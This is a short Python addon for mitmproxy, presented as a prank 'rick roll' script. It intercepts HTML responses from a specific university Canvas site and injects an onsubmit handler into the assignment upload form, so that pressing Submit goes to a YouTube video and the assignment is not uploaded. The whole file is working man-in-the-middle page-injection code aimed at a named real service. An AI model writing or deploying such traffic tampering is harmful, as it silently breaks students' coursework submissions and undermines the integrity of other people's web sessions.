"""This is a simple rick roll script for MitMProxy. It takes any submission on
canvas and makes the submit button go to a rick roll instead.
"""
__author__ = ["Nick Cottrell", "Robbie Heine", "Alex Schmith"]

from mitmproxy import http


def response(flow: http.HTTPFlow) -> None:
    if "fit.instructure.com" in flow.request.pretty_host:
        if b"<button type=\"submit\" class=\"btn btn-primary\" id=\"submit_file_button\">Submit Assignment</button>" in flow.response.content and b"<form id=\"submit_online_upload_form\"" in flow.response.content:
            flow.response.content = flow.response.content.replace(
                b"<form id=\"submit_online_upload_form\"", b"<form id=\"submit_online_upload_form\" onsubmit=\"window.location.href=\'https://youtu.be/dQw4w9WgXcQ\'\"")
